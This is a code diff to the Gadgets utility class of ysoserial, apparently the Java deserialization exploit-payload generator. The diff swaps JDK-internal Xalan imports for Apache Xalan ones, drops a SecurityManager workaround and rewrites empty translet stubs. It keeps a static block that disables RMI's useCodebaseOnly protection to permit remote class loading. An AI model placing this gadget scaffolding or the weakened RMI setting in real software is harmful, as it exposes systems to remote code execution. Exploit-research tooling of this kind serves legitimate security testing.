@@ -1,8 +1,6 @@
 package ysoserial.payloads.util;
 
 
-import static com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl.DESERIALIZE_TRANSLET;
-
 import java.io.Serializable;
 import java.lang.reflect.Array;
 import java.lang.reflect.Constructor;
@@ -16,13 +14,13 @@ import javassist.ClassClassPath;
 import javassist.ClassPool;
 import javassist.CtClass;
 
-import com.sun.org.apache.xalan.internal.xsltc.DOM;
-import com.sun.org.apache.xalan.internal.xsltc.TransletException;
-import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
-import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
-import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
-import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
-import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
+import org.apache.xalan.xsltc.DOM;
+import org.apache.xalan.xsltc.TransletException;
+import org.apache.xalan.xsltc.runtime.AbstractTranslet;
+import org.apache.xalan.xsltc.trax.TemplatesImpl;
+import org.apache.xalan.xsltc.trax.TransformerFactoryImpl;
+import org.apache.xml.dtm.DTMAxisIterator;
+import org.apache.xml.serializer.SerializationHandler;
 
 
 /*
@@ -34,8 +32,6 @@ import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
 public class Gadgets {
 
     static {
-        // special case for using TemplatesImpl gadgets with a SecurityManager enabled
-        System.setProperty(DESERIALIZE_TRANSLET, "true");
         
         // for RMI remote loading
         System.setProperty("java.rmi.server.useCodebaseOnly", "false");
@@ -48,11 +44,18 @@ public class Gadgets {
         private static final long serialVersionUID = -5971610431559700674L;
 
 
-        public void transform ( DOM document, SerializationHandler[] handlers ) throws TransletException {}
-
-
         @Override
-        public void transform ( DOM document, DTMAxisIterator iterator, SerializationHandler handler ) throws TransletException {}
+        public void transform(DOM arg0, DTMAxisIterator arg1,
+                SerializationHandler arg2) throws TransletException {
+            // TODO Auto-generated method stub
+            
+        }
+
+
+        public void transform(DOM arg0, SerializationHandler[] arg1) throws TransletException {
+            // TODO Auto-generated method stub
+            
+        }
     }
 
     // required to make TemplatesImpl happy
